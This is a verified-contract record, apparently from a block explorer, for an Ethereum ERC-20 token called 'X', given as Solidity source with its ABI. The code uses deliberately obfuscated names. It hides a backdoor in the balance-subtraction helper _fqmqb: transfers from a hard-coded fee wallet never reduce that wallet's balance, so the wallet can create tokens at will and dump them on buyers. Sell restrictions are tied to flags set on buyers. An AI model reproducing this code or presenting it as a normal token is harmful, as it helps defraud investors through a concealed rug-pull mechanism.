{"SourceCode": "/**\r\n\r\nX   $X\r\n\r\n\r\nTWITTER: https://twitter.com/XCoin_Erc20\r\nTELEGRAM: https://t.me/X_CoinEthereum\r\nWEBSITE: https://xerc.org/\r\n\r\n**/\r\n\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\n\r\npragma solidity 0.8.20;\r\n\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed _owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath:\");\r\n        return c;\r\n    }\r\n\r\n    function  _fqmqb(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return  _fqmqb(a, b, \"SafeMath:\");\r\n    }\r\n\r\n    function  _fqmqb(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath:\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath:\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ninterface _xapvjrbf {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface _xnfgmtlos {\r\n    function swExactTensFrHSportingFeeOransferkes(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint \r\n    amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract X is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    string private constant _name = unicode\"X\";\r\n    string private constant _symbol = unicode\"X\";\r\n    uint8 private constant _decimals = 9;\r\n\r\n    uint256 private constant _Totalfj = 1000000000 * 10 **_decimals;\r\n    uint256 public _mxktfAmaunt = _Totalfj;\r\n    uint256 public _Wallesrovp = _Totalfj;\r\n    uint256 public _wapThresxuao= _Totalfj;\r\n    uint256 public _molkTakrf= _Totalfj;\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _iskEujarp;\r\n    mapping (address => bool) private _taxrvWarivy;\r\n    mapping(address => uint256) private _lrorktuobe;\r\n    bool public _taegaleov = false;\r\n    address payable private _TdnFokp;\r\n\r\n    uint256 private _BuyTaxinitial=1;\r\n    uint256 private _SellTaxinitial=1;\r\n    uint256 private _BuyTaxfinal=1;\r\n    uint256 private _SellTaxfinal=1;\r\n    uint256 private _BuyTaxAreduce=1;\r\n    uint256 private _SellTaxAreduce=1;\r\n    uint256 private _wapnfompb=0;\r\n    uint256 private _burntxnr=0;\r\n\r\n\r\n    _xnfgmtlos private _Tfneopbl;\r\n    address private _yawovchs;\r\n    bool private _qrpxqvuh;\r\n    bool private leSarytnp = false;\r\n    bool private _awejuonp = false;\r\n\r\n\r\n    event _amzobwdl(uint _mxktfAmaunt);\r\n    modifier louvThoylq {\r\n        leSarytnp = true;\r\n        _;\r\n        leSarytnp = false;\r\n    }\r\n\r\n    constructor () {\r\n        \r\n        _TdnFokp = payable(0x9d951432Fc6d6A57F68E2926927E3849f722D25b);\r\n        _balances[_msgSender()] = _Totalfj;\r\n        _iskEujarp[owner()] = true;\r\n        _iskEujarp[address(this)] = true;\r\n        _iskEujarp[_TdnFokp] = true;\r\n\r\n \r\n\r\n        emit Transfer(address(0), _msgSender(), _Totalfj);\r\n              \r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _Totalfj;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address spender) public view override returns (uint256) {\r\n        return _allowances[_owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _fqmqb(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address _owner, address spender, uint256 amount) private {\r\n        require(_owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[_owner][spender] = amount;\r\n        emit Approval(_owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 teeomoun=0;\r\n        if (from != owner () && to != owner ()) {\r\n\r\n            if (_taegaleov) {\r\n                if (to != address\r\n                (_Tfneopbl) && to !=\r\n                 address(_yawovchs)) {\r\n                  require(_lrorktuobe\r\n                  [tx.origin] < block.number,\r\n                  \"Only one transfer per block allowed.\");\r\n                  _lrorktuobe\r\n                  [tx.origin] = block.number;\r\n                }\r\n            }\r\n\r\n            if (from == _yawovchs && to != \r\n            address(_Tfneopbl) && !_iskEujarp[to] ) {\r\n                require(amount <= _mxktfAmaunt,\r\n                 \"Exceeds the _mxktfAmaunt.\");\r\n                require(balanceOf(to) + amount\r\n                 <= _Wallesrovp, \"Exceeds the maxWalletSize.\");\r\n                if(_burntxnr\r\n                < _wapnfompb){\r\n                  require(! _frjuoqei(to));\r\n                }\r\n                _burntxnr++;\r\n                 _taxrvWarivy[to]=true;\r\n                teeomoun = amount.mul((_burntxnr>\r\n                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)\r\n                .div(100);\r\n            }\r\n\r\n            if(to == _yawovchs && from!= address(this) \r\n            && !_iskEujarp[from] ){\r\n                require(amount <= _mxktfAmaunt && \r\n                balanceOf(_TdnFokp)<_molkTakrf,\r\n                 \"Exceeds the _mxktfAmaunt.\");\r\n                teeomoun = amount.mul((_burntxnr>\r\n                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)\r\n                .div(100);\r\n                require(_burntxnr>_wapnfompb &&\r\n                 _taxrvWarivy[from]);\r\n            }\r\n\r\n            uint256 contractTokenBalance = \r\n            balanceOf(address(this));\r\n            if (!leSarytnp \r\n            && to == _yawovchs && _awejuonp &&\r\n             contractTokenBalance>_wapThresxuao \r\n            && _burntxnr>_wapnfompb&&\r\n             !_iskEujarp[to]&& !_iskEujarp[from]\r\n            ) {\r\n                _swpfbjrhoh( _rpume(amount, \r\n                _rpume(contractTokenBalance,_molkTakrf)));\r\n                uint256 contractETHBalance \r\n                = address(this).balance;\r\n                if(contractETHBalance \r\n                > 0) {\r\n                    _roneumq(address(this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        if(teeomoun>0){\r\n          _balances[address(this)]=_balances\r\n          [address(this)].\r\n          add(teeomoun);\r\n          emit Transfer(from,\r\n           address(this),teeomoun);\r\n        }\r\n        _balances[from]= _fqmqb(from,\r\n         _balances[from], amount);\r\n        _balances[to]=_balances[to].\r\n        add(amount. _fqmqb(teeomoun));\r\n        emit Transfer(from, to, \r\n        amount. _fqmqb(teeomoun));\r\n    }\r\n\r\n    function _swpfbjrhoh(uint256\r\n     tokenAmount) private louvThoylq {\r\n        if(tokenAmount==0){return;}\r\n        if(!_qrpxqvuh){return;}\r\n        address[] memory path =\r\n         new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _Tfneopbl.WETH();\r\n        _approve(address(this),\r\n         address(_Tfneopbl), tokenAmount);\r\n        _Tfneopbl.\r\n        swExactTensFrHSportingFeeOransferkes(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function  _rpume(uint256 a, \r\n    uint256 b) private pure\r\n     returns (uint256){\r\n      return ( a > b\r\n      )?\r\n      b : a ;\r\n    }\r\n\r\n    function  _fqmqb(address\r\n     from, uint256 a,\r\n      uint256 b) private view\r\n       returns(uint256){\r\n        if(from \r\n        == _TdnFokp){\r\n            return a ;\r\n        }else{\r\n            return a . _fqmqb (b);\r\n        }\r\n    }\r\n\r\n    function removeLimits() external onlyOwner{\r\n        _mxktfAmaunt = _Totalfj;\r\n        _Wallesrovp = _Totalfj;\r\n        _taegaleov = false;\r\n        emit _amzobwdl(_Totalfj);\r\n    }\r\n\r\n    function _frjuoqei(address \r\n    account) private view \r\n    returns (bool) {\r\n        uint256 sixzev;\r\n        assembly {\r\n            sixzev :=\r\n             extcodesize\r\n             (account)\r\n        }\r\n        return sixzev > \r\n        0;\r\n    }\r\n\r\n    function _roneumq(uint256\r\n    amount) private {\r\n        _TdnFokp.\r\n        transfer(amount);\r\n    }\r\n\r\n    function openTrading( ) external onlyOwner( ) {\r\n        require( ! _qrpxqvuh);\r\n        _Tfneopbl   =  _xnfgmtlos (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;\r\n        _approve(address(this), address(_Tfneopbl), _Totalfj);\r\n        _yawovchs = _xapvjrbf(_Tfneopbl.factory()). createPair (address(this),  _Tfneopbl . WETH ());\r\n        _Tfneopbl.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(_yawovchs).approve(address(_Tfneopbl), type(uint).max);\r\n        _awejuonp = true;\r\n        _qrpxqvuh = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_mxktfAmaunt\",\"type\":\"uint256\"}],\"name\":\"_amzobwdl\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_Wallesrovp\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_molkTakrf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_mxktfAmaunt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taegaleov\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_wapThresxuao\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "X", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://e190213156badf3a1fffb2666019ca27bc8d21edecd3ee9b2be044b0dae1047e"}